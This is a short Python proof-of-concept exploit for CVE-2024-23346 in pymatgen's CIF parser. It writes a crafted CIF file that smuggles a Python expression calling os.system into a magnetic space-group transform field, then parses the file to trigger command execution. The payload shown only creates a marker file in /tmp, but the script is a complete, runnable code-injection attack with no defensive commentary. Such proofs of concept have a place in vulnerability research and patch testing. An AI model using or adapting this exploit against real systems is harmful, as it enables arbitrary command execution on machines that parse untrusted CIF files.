import os

def create_malicious_cif():
    malicious_cif = """
data_test
_audit_creation_date            2024-11-13
_audit_creation_method          "CVE-2024-23346 Pymatgen CIF Parser Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  
'a,b,[__import__("os").system("touch /tmp/pwned_by_cif");0,0,0]'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
"""
    with open("vuln.cif", "w") as file:
        file.write(malicious_cif)
    print("[*] Malicious CIF file created: vuln.cif")

def trigger_exploit():
    from pymatgen.io.cif import CifParser
    parser = CifParser("vuln.cif")
    structures = parser.get_structures()


if __name__ == "__main__":
    print("[*] Exploit running...")
    create_malicious_cif()
    print("[*] Parsing malicious CIF to trigger exploit...")
    trigger_exploit()
